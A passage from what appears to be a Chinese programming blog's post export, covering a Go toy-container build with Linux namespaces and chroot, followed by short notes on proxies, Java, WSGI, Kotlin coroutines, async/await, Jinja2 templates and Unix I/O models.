os.Args[2:], os.Getpid()) cmd := exec.Command(os.Args[2], os.Args[3:]...) cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr must(syscall.Sethostname([]byte(&quot;InNamespace&quot;))) must(cmd.Run())&#125; 上面的程序需要解释下的是 linux 系统中有个符号链接：/proc/self/exe 它代表当前程序，所以在 run 函数里面调用程序本身并加上 child 参数，以实现 隔一层 进程完成预设命令的指向，方便观察结果。 12345678910111213# 进入到子进程所创建的 shell 中，输出当前 PID，可以看到已经实现隔离$ sudo go run docker-2.go run /bin/bashrunning [/bin/bash] as pid: 1root@InNamespace:~/share$ echo $$5root@InNamespace:~/share$ ps PID TTY TIME CMD 18868 pts/1 00:00:00 sudo 18869 pts/1 00:00:00 go 18886 pts/1 00:00:00 docker-2 18890 pts/1 00:00:00 exe 18894 pts/1 00:00:00 bash 18973 pts/1 00:00:00 ps 上面出现了两个矛盾的结果： 运行输出了 running [/bin/bash] as pid: 1 和 echo $$ 的 PID 明显是隔离出来的（用户空间的进程不可能小于 1000）而 ps 显示的进程 PID 明显是没有隔离出来的。 其实这时候是已经实现了隔离，而 ps 命令显示的 PID 不对，甚至 ps -ef 还可以查看到整个系统的所有进程，这是因为 ps 命令只是简单的查看了文件系统里的 /proc 目录而给出内容信息，这时候进程的文件系统是继承于父进程的，所以虽然已经位于新的 PID 命名空间了，但是 ps 还无法正常工作。 所以可以尝试挂载虚拟文件夹 proc 到本地一个文件夹下查看检验下： 12345678910111213141516$ sudo go run docker-2.go run /bin/bashroot@InNamespace:~/share$ mkdir procroot@InNamespace:~/share$ mount -t proc proc proc# 这时候 share/proc 里的内容是正常的，但是 ps 还是查看的 /proc 下的内容root@InNamespace:~/share$ ls proc1 cmdline execdomains kallsyms loadavg mtrr slabinfo timer_list zoneinfo22 consoles fb kcore locks net softirqs timer_stats5 cpuinfo filesystems keys mdstat pagetypeinfo stat tty...# 但是退出之后到宿主机（父进程）上查看其挂载点root@InNamespace:~/share$ exit$ mount...proc on /mnt/hgfs/share/proc type proc (rw,relatime)proc on /mnt/hgfs/share/proc type proc (rw,relatime) 自制容器（子进程）其内的挂载操作会直接影响宿主机（父进程）挂载点，并且 /proc 下的内容需要重新挂载，所以挂载点需要进行进一步地隔离。 版本 three 增加挂载点隔离 自然的想到为 clone 进程时候加上 CLONE_NEWNS 即可达到挂载点隔离的效果，使用该参数之后创建子进程会复制一份父进程的挂载挂载点，之后子进程里的挂载操作不会影响到父进程的挂载点。但是同时要处理挂载 /proc 目录的问题，除了挂载点能不能直接更换所继承的文件系统？ 从下面 Docker 分层文件系统中示意图可以看到，用户空间的文件系统(rootfs)是可以更换的，通过 chroot 系统调用可以更改(jail)当前正在运行的进程及其子进程的根目录。 所以这里找来了一个非常精简的 alpine rootfs, 解压到 /var/lib/alpine 目录下以备后用。 所以更改之后的第三版本是这样的： 123456789101112131415161718func run() &#123; // .. cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123; Cloneflags: syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS, &#125; // ..&#125;func child() &#123; // .. must(syscall.Sethostname([]byte(&quot;InNamespace&quot;))) must(syscall.Chroot(&quot;/var/lib/alpine&quot;)) must(os.Chdir(&quot;/&quot;)) must(syscall.Mount(&quot;proc&quot;, &quot;proc&quot;, &quot;proc&quot;, 0, &quot;&quot;)) must(cmd.Run())&#125; 更改之后的文件命名为 docker-3.go ，由于之前没隔离而有挂载 proc，所以需要记得 umount proc，随后： 12345678910111213141516171819# 运行 bash 会出错，这是因为更换了 alpine 的 rootfs 之后只有没有了 bash 命令$ sudo go run docker-3.go run /bin/bashpanic: fork/exec /bin/bash: no such file or directory$ sudo go run docker-3.go run /bin/sh# 进入容器（子进程shell）后发现 PID 正常了，ps 能够直接使用# alpine 的 shell 提示符更改下/ # export PS1=&#x27;root@$(hostname):$(pwd)$ &#x27;root@InNamespace:/ $ psPID USER TIME COMMAND 1 root 0:00 /proc/self/exe child /bin/sh 6 root 0:00 /bin/sh 9 root 0:00 ps# mount 显示的挂载点也非常简单，也就是在程序里自行挂载的 proc，这时候 top 也是正常的root@InNamespace:/ $ cat /proc/self/mountinfo237 147 0:64 / /proc rw,relatime shared:88 - proc proc rwroot@InNamespace:/ $ exit$ mount...proc on /var/lib/alpine/proc type proc (rw,relatime) 自制容器里 ps 已经能够正常工作了，但退出退出容器后，却发现容器内的挂载是会传播到父进程的，这是因为 systemd 将默认的 mount namespace 的事件传播机制定义成了 MS_SHARED，可以使用 findmnt -o TARGET,PROPAGATION 命令查看目录的 propagation。总体的有：共享挂载（shared mount）、从属挂载（slave mount）和私有挂载（private mount） 在 sudo unshare --mount --uts /bin/bash 里是可以的隔离挂载的，这是因为改变了 mount 的 propagation 为 private。如何改变呢，只需要利用 mount 系统调用更改下父目录，其下的子目录就会更变传播方式，如： 12345678910# 利用 root 用户探究下为什么可以实现挂载的隔离$ strace unshare --mount --uts /bin/echo hi |&amp; grep mountexecve(&quot;/usr/bin/unshare&quot;, [&quot;unshare&quot;, &quot;--mount&quot;, &quot;--uts&quot;, &quot;/bin/echo&quot;, &quot;hi&quot;], [/* 26 vars */]) = 0mount(&quot;none&quot;, &quot;/&quot;, NULL, MS_REC|MS_PRIVATE, NULL) = 0# 照葫芦画瓢$ strace mount --make-rshared / |&amp; grep mountexecve(&quot;/bin/mount&quot;, [&quot;mount&quot;, &quot;--make-rshared&quot;, &quot;/&quot;], [/* 21 vars */]) = 0open(&quot;/lib/x86_64-linux-gnu/libmount.so.1&quot;, O_RDONLY|O_CLOEXEC) = 3mount(&quot;none&quot;, &quot;/&quot;, NULL, MS_REC|MS_SHARED, NULL) = 0 但是在 syscall 当中就需要手动的以 private 的方式 mount 一遍根目录以达到效果（要在 chroot 之前）： 1234567891011func child() &#123; // .. must(syscall.Sethostname([]byte(&quot;InNamespace&quot;))) must(syscall.Mount(&quot;&quot;, &quot;/&quot;, &quot;&quot;, uintptr(syscall.MS_PRIVATE|syscall.MS_REC), &quot;&quot;)) must(syscall.Chroot(&quot;/var/lib/alpine&quot;)) must(syscall.Mount(&quot;proc&quot;, &quot;/proc&quot;, &quot;proc&quot;, 0, &quot;&quot;)) must(os.Chdir(&quot;/&quot;)) must(cmd.Run())&#125; 最后运行一下是可以发现，隔离有效的，可以在其内使用 mount --bind a b 试试。处理 chroot 更换更目录还可以使用 PivotRoot + mount MS_BIND 的方式，参考。 版本 next 其实到最后会发现，容器就是一些按一定规则被限制继承父进程的某些资源的子进程。 如果后续继续完善其他的 namespace 然后再加以 cgroups 限制 CPU、内存、磁盘、网络等，然后在加上分层存储 Union FS，可能就是完成了一个真正意义上的简化的 Docker。 参考 C 版本的实践 shell 版本的实践 一个 go 版本实现 CLONE_NEWNS PivotRoot + mount mount propagation mount propagation in namespace stackoverflow mount share 《自己动手写Docker》 https://www.cnblogs.com/sparkdev/p/9365405.html"},{"title":"正向反向代理","date":"2021-01-23","updated":"2024-03-19","path":"2021/01/23/正向反向代理/","text":"应用 正向代理 网络加速，游戏加速，隐藏ip，过滤内容去广告 反向代理 负载均衡，隐藏服务端"},{"title":"Java核心技术1-1","date":"2021-01-18","updated":"2024-03-19","path":"2021/01/18/Java核心技术1-1/","text":"构建字符串 每次连接字符串都会构建一个新的String对象，既耗时，又浪费空间，所以推荐使用StringBuilder类 123StringBuilder builder = new StringBuilder();builder.append(ch);builder.append(str); switch 数组 会自动初始化为0，false，null 与C++区别 – 引用 指针 编译 对象 所有java对象都是在堆中构造的。（优化可能会被拆分） 重载 构造器初始化 继承"},{"title":"WSGI","date":"2021-01-17","updated":"2024-03-19","path":"2021/01/17/WSGI/","text":"WSGI server将请求封装成字典 WSGI处理后生成HTML响应，调用start_response() 返回头部信息 做python Web开发你要理解：WSGI &amp; uwsgi https://www.bilibili.com/video/BV1hE411h7dz?p=2"},{"title":"协程","date":"2020-12-24","updated":"2024-03-19","path":"2020/12/24/协程/","text":"摘要 协成写起来方便，能异步代码同步去写，协程重要的是切换到别的线程后还可以自动切换回来。 每个语言对协程的实现有所不同 协程存在于用户态，大量的协程实际上只占用了内核态的一个线程。 当协程数量和内核线程的数量不一致时，需要有调度器来维护所有的协程，尽可能让它们公平地使用CPU。 协程是什么 「协程 Coroutines」源自 Simula 和 Modula-2 语言，这个术语早在 1958 年就被 Melvin Edward Conway 发明并用于构建汇编程序，说明协程是一种编程思想，并不局限于特定的语言。 我们所有的代码都是跑在线程中的，而线程是跑在进程中的。 协程没有直接和操作系统关联，但它不是空中楼阁，它也是跑在线程中的，可以是单线程，也可以是多线程。 单线程中的协程总的执行时间并不会比不用协程少。 Android 系统上，如果在主线程进行网络请求，会抛出 NetworkOnMainThreadException，对于在主线程上的协程也不例外，这种场景使用协程还是要切线程的。 协程好在哪里 在 Java 中要实现并发操作通常需要开启一个 Thread ： 123456new Thread(new Runnable() &#123; @Override public void run() &#123; ... &#125;&#125;).start(); 直接使用 Thead 的那些困难和不方便： 线程什么时候执行结束 线程间的相互通信 多个线程的管理 可以用 Java 的 Executor 线程池来进行线程管理： 1234val executor = Executors.newCachedThreadPool()executor.execute(&#123; ...&#125;) 但它的缺点也很明显： 需要处理很多回调，如果业务多则容易陷入「回调地狱」。 硬是把业务拆分成了前台、中间更新、后台三个函数。 解决回调地狱的方法一般是使用RxJava，RxJava，准确来讲是 ReactiveX 在 Java 上的实现，是一种响应式程序框架，我们通过它提供的「Observable」的编程范式进行链式调用，可以很好地消除回调。 下面的例子是使用协程进行网络请求获取用户信息并显示到 UI 控件上： 1234567891011121314151617181920212223coroutineScope.launch(Dispatchers.Main) &#123; // 在主线程开启协程 val user = api.getUser() // IO 线程执行网络请求 nameTv.text = user.name // 主线程更新 UI&#125;这个 launch 函数，它具体的含义是：我要创建一个新的协程，并在指定的线程上运行它。这个被创建、被运行的所谓「协程」是谁？就是你传给 launch 的那些代码，这一段连续代码叫做一个「协程」。而通过 Java 实现以上逻辑，我们通常需要这样写：api.getUser(new Callback&lt;User&gt;() &#123; @Override public void success(User user) &#123; runOnUiThread(new Runnable() &#123; @Override public void run() &#123; nameTv.setText(user.name); &#125; &#125;) &#125; @Override public void failure(Exception e) &#123; ... &#125;&#125;); 这里只是展示了一个代码片段，launch 并不是一个顶层函数，它必须在一个对象中使用，这里只关心它内部业务逻辑的写法。 launch 函数加上实现在 &#123;&#125; 中具体的逻辑，就构成了一个协程。 通常做网络请求，要不就传一个 callback，要不就是在 IO 线程里进行阻塞式的同步调用，而在这段代码中，上下两个语句分别工作在两个线程里，但写法上看起来和普通的单线程代码一样。 协程的「1 到 0」 对于回调式的写法，如果并发场景再复杂一些，代码的嵌套可能会更多，这样的话维护起来就非常麻烦。但如果你使用了 Kotlin 协程，多层网络请求只需要这么写：如果遇到的场景是多个网络请求需要等待所有请求结束之后再对 UI 进行更新。比如以下两个请求： 1234🏝️api.getAvatar(user, callback)api.getCompanyLogo(user, callback) 如果使用回调式的写法，那么代码可能写起来既困难又别扭。于是我们可能会选择妥协，通过先后请求代替同时请求： 1234567🏝️api.getAvatar(user) &#123; avatar -&gt; api.getCompanyLogo(user) &#123; logo -&gt; show(merge(avatar, logo)) &#125;&#125; 在实际开发中如果这样写，本来能够并行处理的请求被强制通过串行的方式去实现，可能会导致等待时间长了一倍，也就是性能差了一倍。 而如果使用协程，可以直接把两个并行请求写成上下两行，最后再把结果进行合并即可： 12345678910🏝️coroutineScope.launch(Dispatchers.Main) &#123; // 👇 async 函数之后再讲 val avatar = async &#123; api.getAvatar(user) &#125; // 获取用户头像 val logo = async &#123; api.getCompanyLogo(user) &#125; // 获取用户所在公司的 logo val merged = suspendingMerge(avatar, logo) // 合并结果 // 👆 show(merged) // 更新 UI&#125; 可以看到，即便是比较复杂的并行网络请求，也能够通过协程写出结构清晰的代码。需要注意的是 suspendingMerge 并不是协程 API 中提供的方法，而是我们自定义的一个可「挂起」的结果合并方法。至于挂起具体是什么，可以看下一篇文章。 让复杂的并发代码，写起来变得简单且清晰，是协程的优势。 这里，两个没有相关性的后台任务，因为用了协程，被安排得明明白白，互相之间配合得很好，也就是我们之前说的「协作式任务」。 本来需要回调，现在直接没有回调了，这种从 1 到 0 的设计思想真的妙哉。 这里的 api.getUser 是一个挂起函数，所以能够保证 nameTv.text 的正确赋值，这就涉及到了协程中最著名的**「非阻塞式挂起」** 什么时候用协程？ 什么时候用协程？当你需要切线程或者指定线程的时候。 你要在后台执行任务？切！ 12345🏝️launch(Dispatchers.IO) &#123; val image = getImage(imageId)&#125; 然后需要在前台更新界面？再切！ 12345678🏝️coroutineScope.launch(Dispatchers.IO) &#123; val image = getImage(imageId) launch(Dispatchers.Main) &#123; avatarIv.setImageBitmap(image) &#125;&#125; 好像有点不对劲？这不还是有嵌套嘛。 如果只是使用 launch 函数，协程并不能比线程做更多的事。不过协程中却有一个很实用的函数：withContext 。这个函数可以切换到指定的线程，并在闭包内的逻辑执行结束之后，自动把线程切回去继续执行。那么可以将上面的代码写成这样： 12345678🏝️coroutineScope.launch(Dispatchers.Main) &#123; // 👈 在 UI 线程开始 val image = withContext(Dispatchers.IO) &#123; // 👈 切换到 IO 线程，并在执行完成后切回 UI 线程 getImage(imageId) // 👈 将会运行在 IO 线程 &#125; avatarIv.setImageBitmap(image) // 👈 回到 UI 线程更新 UI&#125; 这种写法看上去好像和刚才那种区别不大，但如果你需要频繁地进行线程切换，这种写法的优势就会体现出来。可以参考下面的对比： 12345678910111213141516171819202122232425262728🏝️// 第一种写法coroutineScope.launch(Dispatchers.IO) &#123; ... launch(Dispatchers.Main)&#123; ... launch(Dispatchers.IO) &#123; ... launch(Dispatchers.Main) &#123; ... &#125; &#125; &#125;&#125;// 通过第二种写法来实现相同的逻辑coroutineScope.launch(Dispatchers.Main) &#123; ... withContext(Dispatchers.IO) &#123; ... &#125; ... withContext(Dispatchers.IO) &#123; ... &#125; ...&#125; 由于可以&quot;自动切回来&quot;，消除了并发代码在协作时的嵌套。由于消除了嵌套关系，我们甚至可以把 withContext 放进一个单独的函数里面： 12345678910🏝️launch(Dispatchers.Main) &#123; // 👈 在 UI 线程开始 val image = getImage(imageId) avatarIv.setImageBitmap(image) // 👈 执行结束后，自动切换回 UI 线程&#125;// 👇fun getImage(imageId: Int) = withContext(Dispatchers.IO) &#123; ...&#125; 这就是之前说的「用同步的方式写异步的代码」了。 不过如果只是这样写，编译器是会报错的： 12345🏝️fun getImage(imageId: Int) = withContext(Dispatchers.IO) &#123; // IDE 报错 Suspend function&#x27;withContext&#x27; should be called only from a coroutine or another suspend funcion&#125; 意思是说，withContext 是一个 suspend 函数，它需要在协程或者是另一个 suspend 函数中调用。 suspend 挂起是什么 launch ，async 或者其他函数创建的协程，在执行到某一个 suspend 函数的时候，这个协程会被「suspend」，也就是被挂起。 那此时又是从哪里挂起？从当前线程挂起。换句话说，就是这个协程从正在执行它的线程上脱离。 注意，不是这个协程停下来了！是脱离，当前线程不再管这个协程要去做什么了。 suspend 是有暂停的意思，但我们在协程中应该理解为：当线程执行到协程的 suspend 函数的时候，暂时不继续执行协程代码了。 我们先让时间静止，然后兵分两路，分别看看这两个互相脱离的线程和协程接下来将会发生什么事情： 线程： 前面我们提到，挂起会让协程从正在执行它的线程上脱离，具体到代码其实是： 协程的代码块中，线程执行到了 suspend 函数这里的时候，就暂时不再执行剩余的协程代码，跳出协程的代码块。 那线程接下来会做什么呢？ 如果它是一个后台线程： 要么无事可做，被系统回收 要么继续执行别的后台任务 跟 Java 线程池里的线程在工作结束之后是完全一样的：回收或者再利用。 如果这个线程它是 Android 的主线程，那它接下来就会继续回去工作：也就是一秒钟 60 次的界面刷新任务。 协程： 线程的代码在到达 suspend 函数的时候被掐断，接下来协程会从这个 suspend 函数开始继续往下执行，不过是在指定的线程。 谁指定的？是 suspend 函数指定的，比如我们这个例子中，函数内部的 withContext 传入的 Dispatchers.IO 所指定的 IO 线程。 Dispatchers 调度器，它可以将协程限制在一个特定的线程执行，或者将它分派到一个线程池，或者让它不受限制地运行，关于 Dispatchers 这里先不展开了。 那常用到的调度器有哪些？ 常用的 Dispatchers ，有以下三种： Dispatchers.Main：Android 中的主线程 Dispatchers.IO：针对磁盘和网络 IO 进行了优化，适合 IO 密集型的任务，比如：读写文件，操作数据库以及网络请求 Dispatchers.Default：适合 CPU 密集型的任务，比如计算 回到我们的协程，它从 suspend 函数开始脱离启动它的线程，继续执行在 Dispatchers 所指定的 IO 线程。 紧接着在 suspend 函数执行完成之后，协程为我们做的最爽的事就来了：会自动帮我们把线程再切回来（resume）。 这个「切回来」是什么意思？ 我们的协程原本是运行在主线程的，当代码遇到 suspend 函数的时候，发生线程切换，根据 Dispatchers 切换到了 IO 线程； 当这个函数执行完毕后，线程又切了回来，「切回来」也就是协程会帮我再 post 一个 Runnable，让我剩下的代码继续回到主线程去执行。 我们从线程和协程的两个角度都分析完成后，终于可以对协程的「挂起」suspend 做一个解释： 协程在执行到有 suspend 标记的函数的时候，会被 suspend 也就是被挂起，而所谓的被挂起，就是切个线程； 不过区别在于，挂起函数在执行完成之后，协程会重新切回它原先的线程。 再简单来讲，就是一个稍后会被自动切回来的线程调度操作。 suspend 关键字的意义？ 这个 suspend 关键字，既然它并不是真正实现挂起，那它的作用是什么？ 它其实是一个提醒。 函数的创建者对函数的使用者的提醒：我是一个耗时函数，我被我的创建者用挂起的方式放在后台运行，所以请在协程里调用我。 什么是非阻塞式挂起 线程阻塞很好理解，现实中的例子就是交通堵塞，它的核心有 3 点： 前面有障碍物，你过不去（线程卡了） 需要等障碍物清除后才能过去（耗时任务结束） 除非你绕道而行（切到别的线程） 阻塞不阻塞，都是针对单线程讲的，一旦切了线程，肯定是非阻塞的，你都跑到别的线程了，之前的线程就自由了，可以继续做别的事情了。 协程的挂起，就是非阻塞式的，协程是不讲「阻塞式的挂起」的概念的，因为挂起这件事，本来就是涉及到多线程。 所以「非阻塞式挂起」，其实就是在讲协程在挂起的同时切线程这件事情。 下面的例子重点是说线程虽然会切，但写法上和普通的单线程差不多。 123456789101112main &#123; GlobalScope.launch(Dispatchers.Main) &#123; // 👇 耗时操作 val user = suspendingRequestUser() updateView(user) &#125; private suspend fun suspendingRequestUser() : User = withContext(Dispatchers.IO) &#123; api.requestUser() &#125;&#125; 从上面的例子可以看到，耗时操作和更新 UI 的逻辑像写单线程一样放在了一起，只是在外面包了一层协程。 而正是这个协程解决了原来我们单线程写法会卡线程这件事。 阻塞的本质 首先，所有的代码本质上都是阻塞式的，而只有比较耗时的代码才会导致人类可感知的等待，比如在主线程上做一个耗时 50 ms 的操作会导致界面卡掉几帧，这种是我们人眼能观察出来的，而这就是我们通常意义所说的「阻塞」。 举个例子，当你开发的 app 在性能好的手机上很流畅，在性能差的老手机上会卡顿，就是在说同一行代码执行的时间不一样。 视频中讲了一个网络 IO 的例子，IO 阻塞更多是反映在「等」这件事情上，它的性能瓶颈是和网络的数据交换，你切多少个线程都没用，该花的时间一点都少不了。 而这跟协程半毛钱关系没有，切线程解决不了的事情，协程也解决不了。 summary 协程是什么、挂起是什么、挂起的非阻塞式是怎么回事，非常简单： 协程就是切线程； 挂起就是可以自动切回来的切线程； 挂起的非阻塞式指的是它能用看起来阻塞的代码写出非阻塞的操作，就这么简单。"},{"title":"async/await 协程","date":"2020-12-12","updated":"2024-03-19","path":"2020/12/12/async-await-协程/","text":"https://developer.mozilla.org/zh-CN/docs/learn/JavaScript/异步/Async_await https://juejin.cn/post/6844903599932178439 Async/await 让你的代码看起来是同步的，在某种程度上，也使得它的行为更加地同步。 await 关键字会阻塞其后的代码，直到promise完成，就像执行同步操作一样。它确实可以允许其他任务在此期间继续运行，但您自己的代码被阻塞。 async/await的缺陷 了解Async/await是非常有用的，但还有一些缺点需要考虑。 Async/await 让你的代码看起来是同步的，在某种程度上，也使得它的行为更加地同步。 await 关键字会阻塞其后的代码，直到promise完成，就像执行同步操作一样。它确实可以https://juejin.cn/post/6844903599932178439允许其他任务在此期间继续运行，但您自己的代码被阻塞。 这意味着您的代码可能会因为大量await的promises相继发生而变慢。每个await都会等待前一个完成，而你实际想要的是所有的这些promises同时开始处理（就像我们没有使用async/await时那样）。 有一种模式可以缓解这个问题——通过将 Promise 对象存储在变量中来同时开始它们，然后等待它们全部执行完毕。"},{"title":"jinja2模板用法","date":"2020-12-07","updated":"2024-03-19","path":"2020/12/07/jinja2模板用法/","text":"1. 语法 下面是一个简单的jinja2例子 12345&#123;# This is jinja code &#123;% for file in filenames %&#125; ... &#123;% endfor %&#125;#&#125; 2. 过滤器 变量可以通过“过滤器”进行修改，过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。 常用的过滤器有： 过滤器名称 说明 safe 渲染时值不转义 capitialize 把值的首字母转换成大写，其他子母转换为小写 lower 把值转换成小写形式 upper 把值转换成大写形式 title 把值中每个单词的首字母都转换成大写 trim 把值的首尾空格去掉 striptags 渲染之前把值中所有的HTML标签都删掉 join 拼接多个值为字符串 replace 替换字符串的值 round 默认对数字进行四舍五入，也可以用参数进行控制 int 把值转换成整型 那么如何使用这些过滤器呢？ 只需要在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。 123456789101112131415&#123;&#123; &#x27;abc&#x27; | captialize &#125;&#125;# Abc &#123;&#123; &#x27;abc&#x27; | upper &#125;&#125;# ABC &#123;&#123; &#x27;hello world&#x27; | title &#125;&#125;# Hello World &#123;&#123; &quot;hello world&quot; | replace(&#x27;world&#x27;,&#x27;daxin&#x27;) | upper &#125;&#125;# HELLO DAXIN &#123;&#123; 18.18 | round | int &#125;&#125;# 18 3. for循环 jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。 迭代列表 12345&lt;ul&gt;&#123;% for user in users %&#125;&lt;li&gt;&#123;&#123; user.username|title &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt; 迭代字典 1234567&lt;dl&gt;&#123;% for key, value in my_dict.iteritems() %&#125;&lt;dt&gt;&#123;&#123; key &#125;&#125;&lt;/dt&gt;&lt;dd&gt;&#123;&#123; value&#125;&#125;&lt;/dd&gt;&#123;% endfor %&#125;&lt;/dl&gt; 4. 宏 宏类似于Python中的函数，我们在宏中定义行为，还可以进行传递参数，就像Python中的函数一样一样儿的。 在宏中定义一个宏的关键字是macro，后面跟其 宏的名称和参数等 12345&#123;% macro input(name,age=18) %&#125; # 参数age的默认值为18 &lt;input type=&#x27;text&#x27; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123; age &#125;&#125;&quot; &gt; &#123;% endmacro %&#125; 调用方法也和Python的类似 12&lt;p&gt;&#123;&#123; input(&#x27;daxin&#x27;) &#125;&#125; &lt;/p&gt;&lt;p&gt;&#123;&#123; input(&#x27;daxin&#x27;,age=20) &#125;&#125; &lt;/p&gt; 5. 继承和super函数 jinja2中最强大的部分就是模板继承。模板继承允许我们创建一个基本(骨架)文件，其他文件从该骨架文件继承，然后针对自己需要的地方进行修改。 jinja2的骨架文件中，利用block关键字表示其包涵的内容可以进行修改。 以下面的骨架文件base.html为例： 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &#123;% block head %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;/&gt; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Webpage&lt;/title&gt; &#123;% endblock %&#125;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;content&quot;&gt;&#123;% block content %&#125;&#123;% endblock %&#125;&lt;/div&gt;&lt;div id=&quot;footer&quot;&gt; &#123;% block footer %&#125; &lt;script&gt;This is javascript code &lt;/script&gt; &#123;% endblock %&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 这里定义了四处 block，即：head，title，content，footer。那怎么进行继承和变量替换呢？注意看下面的文件 123456789101112&#123;% extend &quot;base.html&quot; %&#125; # 继承base.html文件 &#123;% block title %&#125; Dachenzi &#123;% endblock %&#125; # 定制title部分的内容 &#123;% block head %&#125; &#123;&#123; super() &#125;&#125; # 用于获取原有的信息 &lt;style type=&#x27;text/css&#x27;&gt; .important &#123; color: #FFFFFF &#125; &lt;/style&gt;&#123;% endblock %&#125; # 其他不修改的原封不动的继承 6. 利用jinja2进行渲染 jinja2模块中有一个名为Enviroment的类，这个类的实例用于存储配置和全局对象，然后从文件系统或其他位置中加载模板。 1. 基本使用方法 大多数应用都在初始化的时候撞见一个Environment对象，并用它加载模板。Environment支持两种加载方式： PackageLoader：包加载器 FileSystemLoader：文件系统加载器 2. PackageLoader 使用包加载器来加载文档的最简单的方式如下： 123456from jinja2 import PackageLoader,Environmentenv = Environment(loader=PackageLoader(&#x27;python_project&#x27;,&#x27;templates&#x27;)) # 创建一个包加载器对象 template = env.get_template(&#x27;bast.html&#x27;) # 获取一个模板文件template.render(name=&#x27;daxin&#x27;,age=18) # 渲染 其中： PackageLoader()的两个参数为：python包的名称，以及模板目录名称。 get_template()：获取模板目录下的某个具体文件。 render()：接受变量，对模板进行渲染 3. FileSystemLoader 文件系统加载器，不需要模板文件存在某个Python包下，可以直接访问系统中的文件。"},{"title":"同步异步-阻塞非阻塞等Unix5种IO模型","date":"2020-12-07","updated":"2024-03-19","path":"2020/12/07/同步异步-阻塞非阻塞等Unix5种IO模型/","text":"真正意义上的 异步IO 是说内核直接将数据拷贝至用户态的内存单元，再通知程序直接去读取数据。 select / poll / epoll 都是同步IO的多路复用模式 用户空间和内核空间 在Linux/Unix中，对于一次读取IO的操作，数据并不会直接拷贝到应用程序的缓冲区(用户空间)，它首先会被拷贝到操作系统内核的缓冲区(内核空间)中，然后才会从操作系统内核的缓冲区拷贝到应用程序的缓冲区 可以看做是两个过程：1. Waiting for the data to be ready(等待数据到达内核缓冲区)；2. Copying the data from the kernel to the process(从内核缓冲区拷贝数据到应用程序缓冲区) 同步/异步、阻塞/非阻塞 同步和异步关注的是消息通信机制 所谓同步，就是在发出一个调用时，没得到结果之前，该调用就不返回。但是一旦调用返回就得到返回值了，调用者主动等待这个调用的结果 所谓异步，就是在发出一个调用时，这个调用就直接返回了，不管返回有没有结果。当一个异步过程调用发出后，被调用者通过状态，通知来通知调用者，或者通过回调函数处理这个调用 阻塞和非阻塞关注的是程序在等待调用结果时的状态 阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才返回 非阻塞调用是指在不能立即得到结果之前，该调用不会阻塞当前线程 同步 发出一个功能调用时，在没有得到结果之前，该调用就不返回，也就是必须一件一件事做，等前一件做完了才能做下一件事 异步 当一个异步过程调用发出后，调用者一般不能立刻得到结果，实际处理这个调用的部件在完成后，通过状态、通知和回调来通知调用者 通知调用者的三种方式： 状态——监听被调用者的状态(轮询)，调用者需要每隔一定时间检查一次，效率会很低； 通知——当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能 回调——当被调用者执行完成后，会调用调用者提供的回调函数 阻塞 调用结果返回之前，当前线程会被挂起(线程进入非可执行状态，在这个状态下，OS不会给线程分配时间片，即线程暂停运行)，调用结果返回后线程进入就绪态 非阻塞 调用结果返回之前，该函数不会阻塞当前线程，而会立刻返回 同步和异步的区别 请求发出后，是否需要等待结果，才能继续执行其他操作 在网络IO模型中，数据拷贝时进程阻塞是同步，反之则是是异步 阻塞和同步的区别 同步调用在结果返回之前，线程并没有进入挂起状态，OS还会给它分配占用CPU的时间片；阻塞调用在结果返回之前，线程处于挂起状态，OS不会再为其分配占用CPU的时间片，直到结果返回后，线程进入就绪状态在可能继续运行 阻塞和非阻塞的区别 在网络IO模型中，应用程序的调用立即返回是非阻塞，反之则是阻塞 同步/异步和阻塞/非阻塞的区别 在网络编程中，阻塞和非阻塞发生在第一阶段(准备数据阶段)；同步和异步发生在第二阶段(准备好的数据从内核缓冲区拷贝到用户进程缓冲区阶段) 网络上的例子 老张爱喝茶，废话不说，煮开水。 出场人物：老张，水壶两把（普通水壶，简称水壶；会响的水壶，简称响水壶）。 1 老张把水壶放到火上，立等水开。（同步阻塞）；立等就是阻塞了老张去干别的事，老张得一直主动的看着水开没，这就是同步 2 老张把水壶放到火上，去客厅看电视，时不时去厨房看看水开没有。（同步非阻塞）；老张去看电视了，这就是非阻塞了，但是老张还是得关注着水开没，这也就是同步了 3 老张把响水壶放到火上，立等水开。（异步阻塞）；立等就是阻塞了老张去干别的事，但是老张不用时刻关注水开没，因为水开了，响水壶会提醒他，这就是异步了 4 老张把响水壶放到火上，去客厅看电视，水壶响之前不再去看它了，响了再去拿壶。（异步非阻塞）；老张去看电视了，这就是非阻塞了，而且，等水开了，响水壶会提醒他，这就是异步了 所谓同步异步，只是对于水壶而言。普通水壶，同步；响水壶，异步。对应的也就是消息通信机制 虽然都能干活，但响水壶可以在自己完工之后，提示老张水开了。这是普通水壶所不能及的。同步只能让调用者去轮询自己（情况2中），造成老张效率的低下。 所谓阻塞非阻塞，仅仅对于老张而言。立等的老张，阻塞；对应的也就是程序等待结果时的状态 看电视的老张，非阻塞。 情况1和情况3中老张就是阻塞的，媳妇喊他都不知道。虽然3中响水壶是异步的，可对于立等的老张没有太大的意义。所以一般异步是配合非阻塞使用的，这样才能发挥异步的效用。 Unix网络编程5种I/O模型 阻塞I/O(blocking I/O) 当用户进程调用了recvfrom这个系统调用，kernel就开始了IO的第一个阶段：准备数据，对于network IO来说，一般数据在一开始还没有到达，kernel会等待足够的数据到来，而在用户进程这边，整个进程会被阻塞挂起，当kernel等到数据准备好，它就会将数据从内核缓冲区拷贝到用户进程缓冲区，然后kernel返回结果，用户进程才进入就绪状态，重新运行起来 非阻塞I/O(nonblocking IO) 